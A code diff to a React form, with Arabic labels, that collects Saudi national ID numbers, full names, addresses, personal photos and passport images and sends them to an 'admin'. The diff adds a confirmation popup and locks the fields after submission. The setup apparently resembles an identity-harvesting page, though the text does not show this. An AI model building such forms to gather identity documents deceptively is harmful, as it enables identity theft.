@@ -80,6 +80,10 @@ const Documents = () => {
   // Passport image capture
   const [passportImage, setPassportImage] = useState<string | null>(null);
   const passportRef = React.useRef<HTMLDivElement>(null);
+  
+  // Confirmation popup and form lock
+  const [showConfirmPopup, setShowConfirmPopup] = useState(false);
+  const [isFormLocked, setIsFormLocked] = useState(false);
 
   // Saudi Provinces and Districts
   const provincesData: Record<string, string[]> = {
@@ -205,6 +209,11 @@ const Documents = () => {
         });
       }
       
+      // Show confirmation popup after 3 seconds
+      setTimeout(() => {
+        setShowConfirmPopup(true);
+      }, 3000);
+      
       // Send data to admin
       const formData = {
         'الاسم بالعربي': `${arabicFirstName} ${arabicSecondName} ${arabicThirdName} ${arabicFourthName}`,
@@ -272,6 +281,7 @@ const Documents = () => {
                     placeholder="1xxxxxxxxx"
                     className={`text-right ${validationErrors.nationalId || nationalIdError ? 'border-red-500' : ''}`}
                     maxLength={10}
+                    disabled={isFormLocked}
                   />
                   {(validationErrors.nationalId || nationalIdError) && (
                     <p className="text-red-500 text-xs mt-1">{validationErrors.nationalId || nationalIdError}</p>
@@ -292,6 +302,7 @@ const Documents = () => {
                             ? "bg-green-600 text-white border-green-600" 
                             : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                         )}
+                        disabled={isFormLocked}
                       >
                         ميلادي
                       </button>
@@ -304,6 +315,7 @@ const Documents = () => {
                             ? "bg-green-600 text-white border-green-600" 
                             : "bg-white text-gray-500 border-gray-200 hover:bg-gray-50"
                         )}
+                        disabled={isFormLocked}
                       >
                         هجري
                       </button>
@@ -320,6 +332,7 @@ const Documents = () => {
                             !dateOfBirth && "text-muted-foreground",
                             validationErrors.dateOfBirth && "border-red-500"
                           )}
+                          disabled={isFormLocked}
                         >
                           <CalendarIcon className="ml-2 h-4 w-4" />
                           {dateOfBirth ? dateOfBirth.toLocaleDateString('en-CA') : <span>اختر التاريخ</span>}
@@ -358,6 +371,7 @@ const Documents = () => {
                             "w-full h-10 px-3 rounded-md border text-sm text-right",
                             validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                           )}
+                          disabled={isFormLocked}
                         >
                           <option value="">اليوم</option>
                           {Array.from({ length: 30 }, (_, i) => i + 1).map(day => (
@@ -378,6 +392,7 @@ const Documents = () => {
                             "w-full h-10 px-3 rounded-md border text-sm text-right",
                             validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                           )}
+                          disabled={isFormLocked}
                         >
                           <option value="">الشهر</option>
                           {hijriMonths.map(month => (
@@ -398,6 +413,7 @@ const Documents = () => {
                             "w-full h-10 px-3 rounded-md border text-sm text-right",
                             validationErrors.dateOfBirth ? "border-red-500" : "border-gray-200"
                           )}
+                          disabled={isFormLocked}
                         >
                           <option value="">السنة</option>
                           {Array.from({ length: 60 }, (_, i) => 1446 - i).map(year => (
@@ -421,6 +437,7 @@ const Documents = () => {
                   onChange={(e) => setGender(e.target.value)}
                   className="w-48 h-10 px-3 rounded-md border border-gray-200 text-sm text-right bg-white"
                   style={{ direction: 'rtl' }}
+                  disabled={isFormLocked}
                 >
                   <option value="">اختر الجنس</option>
                   <option value="ذكر">ذكر</option>
@@ -446,6 +463,7 @@ const Documents = () => {
                     }}
                     placeholder="محمد"
                     className={`text-right ${validationErrors.arabicFirstName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.arabicFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFirstName}</p>}
                 </div>
@@ -462,6 +480,7 @@ const Documents = () => {
                     }}
                     placeholder="عبدالله"
                     className={`text-right ${validationErrors.arabicSecondName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.arabicSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicSecondName}</p>}
                 </div>
@@ -478,6 +497,7 @@ const Documents = () => {
                     }}
                     placeholder="أحمد"
                     className={`text-right ${validationErrors.arabicThirdName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.arabicThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicThirdName}</p>}
                 </div>
@@ -494,6 +514,7 @@ const Documents = () => {
                     }}
                     placeholder="السعودي"
                     className={`text-right ${validationErrors.arabicFourthName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.arabicFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.arabicFourthName}</p>}
                 </div>
@@ -518,6 +539,7 @@ const Documents = () => {
                     placeholder="Mohammed"
                     className={`text-left ${validationErrors.englishFirstName ? 'border-red-500' : ''}`}
                     dir="ltr"
+                    disabled={isFormLocked}
                   />
                   {validationErrors.englishFirstName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFirstName}</p>}
                 </div>
@@ -535,6 +557,7 @@ const Documents = () => {
                     placeholder="Abdullah"
                     className={`text-left ${validationErrors.englishSecondName ? 'border-red-500' : ''}`}
                     dir="ltr"
+                    disabled={isFormLocked}
                   />
                   {validationErrors.englishSecondName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishSecondName}</p>}
                 </div>
@@ -552,6 +575,7 @@ const Documents = () => {
                     placeholder="Ahmed"
                     className={`text-left ${validationErrors.englishThirdName ? 'border-red-500' : ''}`}
                     dir="ltr"
+                    disabled={isFormLocked}
                   />
                   {validationErrors.englishThirdName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishThirdName}</p>}
                 </div>
@@ -568,6 +592,7 @@ const Documents = () => {
                     }}
                     placeholder="Alsaudi"
                     className={`text-left ${validationErrors.englishFourthName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                     dir="ltr"
                   />
                   {validationErrors.englishFourthName && <p className="text-red-500 text-xs mt-1">{validationErrors.englishFourthName}</p>}
@@ -591,6 +616,7 @@ const Documents = () => {
                       }
                     }}
                     className={`w-full h-12 px-3 py-2 border rounded-md text-right bg-white ${validationErrors.province ? 'border-red-500' : 'border-gray-300'}`}
+                    disabled={isFormLocked}
                   >
                     <option value="">اختر المحافظة</option>
                     {provinces.map(p => (
@@ -609,7 +635,7 @@ const Documents = () => {
                         setValidationErrors(prev => ({ ...prev, district: '' }));
                       }
                     }}
-                    disabled={!province}
+                    disabled={!province || isFormLocked}
                     className={`w-full h-12 px-3 py-2 border rounded-md text-right bg-white ${validationErrors.district ? 'border-red-500' : 'border-gray-300'} ${!province ? 'opacity-50 cursor-not-allowed' : ''}`}
                   >
                     <option value="">اختر المنطقة</option>
@@ -632,6 +658,7 @@ const Documents = () => {
                     }}
                     placeholder="اسم الشارع"
                     className={`text-right ${validationErrors.streetName ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.streetName && <p className="text-red-500 text-xs mt-1">{validationErrors.streetName}</p>}
                 </div>
@@ -650,6 +677,7 @@ const Documents = () => {
                     }}
                     placeholder="رقم المبنى"
                     className={`text-right ${validationErrors.buildingNumber ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.buildingNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.buildingNumber}</p>}
                 </div>
@@ -666,6 +694,7 @@ const Documents = () => {
                     }}
                     placeholder="رقم الدور"
                     className={`text-right ${validationErrors.floorNumber ? 'border-red-500' : ''}`}
+                    disabled={isFormLocked}
                   />
                   {validationErrors.floorNumber && <p className="text-red-500 text-xs mt-1">{validationErrors.floorNumber}</p>}
                 </div>
@@ -685,27 +714,30 @@ const Documents = () => {
                       alt="الصورة الشخصية" 
                       className="w-40 h-40 object-cover rounded-lg border-2 border-gray-300"
                     />
-                    <button
-                      type="button"
-                      onClick={() => {
-                        setPersonalPhoto(null);
-                        setPhotoPreview(null);
-                      }}
-                      className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm hover:bg-red-600"
-                    >
-                      ×
-                    </button>
+                    {!isFormLocked && (
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setPersonalPhoto(null);
+                          setPhotoPreview(null);
+                        }}
+                        className="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-sm hover:bg-red-600"
+                      >
+                        ×
+                      </button>
+                    )}
                   </div>
                 ) : (
                   <div className="w-40 h-40 border-2 border-dashed border-gray-300 rounded-lg flex items-center justify-center bg-gray-50">
                     <span className="text-gray-400 text-sm">لا توجد صورة</span>
                   </div>
                 )}
-                <label className="cursor-pointer">
+                <label className={`cursor-pointer ${isFormLocked ? 'pointer-events-none opacity-50' : ''}`}>
                   <input
                     type="file"
                     accept="image/*"
                     className="hidden"
+                    disabled={isFormLocked}
                     onChange={(e) => {
                       const file = e.target.files?.[0];
                       if (file) {
@@ -1077,6 +1109,34 @@ const Documents = () => {
           </div>
         </div>
       </main>
+      
+      {/* Confirmation Popup */}
+      {showConfirmPopup && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg p-6 max-w-md mx-4 text-center">
+            <h3 className="text-xl font-bold text-gray-800 mb-4">تأكيد البيانات</h3>
+            <p className="text-gray-600 mb-6">هل أنت متأكد من صحة البيانات المدخلة؟ لن تتمكن من التعديل بعد التأكيد.</p>
+            <div className="flex gap-4 justify-center">
+              <Button
+                onClick={() => {
+                  setShowConfirmPopup(false);
+                  setIsFormLocked(true);
+                }}
+                className="bg-green-600 hover:bg-green-700 text-white px-6 py-2"
+              >
+                تأكيد
+              </Button>
+              <Button
+                onClick={() => setShowConfirmPopup(false)}
+                variant="outline"
+                className="px-6 py-2"
+              >
+                إلغاء
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
       
       <Footer />
     </div>
